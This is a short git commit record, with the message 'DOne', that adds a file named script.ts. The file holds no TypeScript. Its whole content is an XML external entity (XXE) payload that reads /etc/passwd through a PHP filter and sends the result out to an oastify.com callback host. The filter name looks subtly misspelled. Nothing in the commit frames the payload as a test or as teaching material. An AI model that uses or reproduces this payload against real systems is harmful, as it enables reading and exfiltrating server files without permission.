2a65e92fc33677f595d3a697e5a8d7b557b0a3d7
Mookul <you@example.com>
2024-12-09 15:10:08 +0530

    DOne

---
+++ My Git/script.ts
@@ -0,0 +1,3 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64encode/resource=/etc/passwd">
+
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://qa4cwfc3oyxyb2469czbh10dm4svgs4h.oastify.com/dtd.xml?%data;'>">
